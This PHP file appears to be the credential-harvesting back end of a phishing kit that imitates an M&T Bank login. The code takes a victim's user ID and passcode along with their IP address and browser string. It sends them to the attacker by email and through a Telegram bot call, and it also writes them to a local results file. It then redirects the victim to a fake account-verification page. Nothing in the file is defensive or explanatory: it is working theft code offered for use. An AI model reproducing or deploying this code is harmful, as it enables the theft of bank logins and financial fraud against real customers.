<?php

error_reporting(0);
session_start();
include "../../email.php";
$ip = getenv("REMOTE_ADDR");
$link = $_SERVER['HTTP_USER_AGENT'] ;
if(
	($_POST['txtUserID'] != "") AND ($_POST['txtPasscode'] != "" ))
{
	$_SESSION["name"]= $_POST['login'];

$hostname = gethostbyaddr($ip);
$message = "[========== M&T  login ===========]\r\n";
$message .= "|User ID      : ".$_POST['txtUserID']."\r\n";
$message .= "|Passcode      	 : ".$_POST['txtPasscode']."\r\n";

$message .= "[========= $ip ========]\r\n";
$message .= "[========= $link ========]\r\n";

$message .= "--------------- @KNYGHT-----------------\n";
$send = $email; 
$subject = "♠️ (".$_POST['login'].") M&T RZLT ♠️ $ip";
$headers = "From: [KNYGHT]<knyghtav@gmail.com>";
mail($send,$subject,$message,$headers);

file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chatid."&text=" . urlencode($message)."" );
$save=fopen("../../KNYGHT_RZLT.txt","a+");
fwrite($save,$message);
fclose($save);

echo"<script>location.replace('../../account verification/');</script>";
}else{echo"error sending";}

?>
